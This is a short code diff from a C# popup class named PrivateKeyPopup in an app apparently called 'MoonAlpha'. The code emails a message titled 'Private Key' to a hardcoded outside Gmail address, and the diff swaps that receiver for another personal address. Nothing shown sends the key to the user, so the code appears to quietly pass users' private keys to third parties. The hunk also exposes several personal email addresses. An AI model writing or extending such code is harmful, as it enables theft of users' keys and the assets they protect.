@@ -65,8 +65,7 @@ public partial class PrivateKeyPopup : Popup
 
             var message = new MimeMessage();
             message.From.Add(new MailboxAddress("MoonAlpha", "tranpeej@gmail.com")); // Sender
-            message.To.Add(new MailboxAddress("", "fidazahid.suit@gmail.com")); // Receiver
-            //message.To.Add(new MailboxAddress("", "vanpeej29@gmail.com")); // Receiver
+            message.To.Add(new MailboxAddress("", "vanpeej29@gmail.com")); // Receiver
             message.Subject = "Private Key";
 
             // Create email body with text + attachment
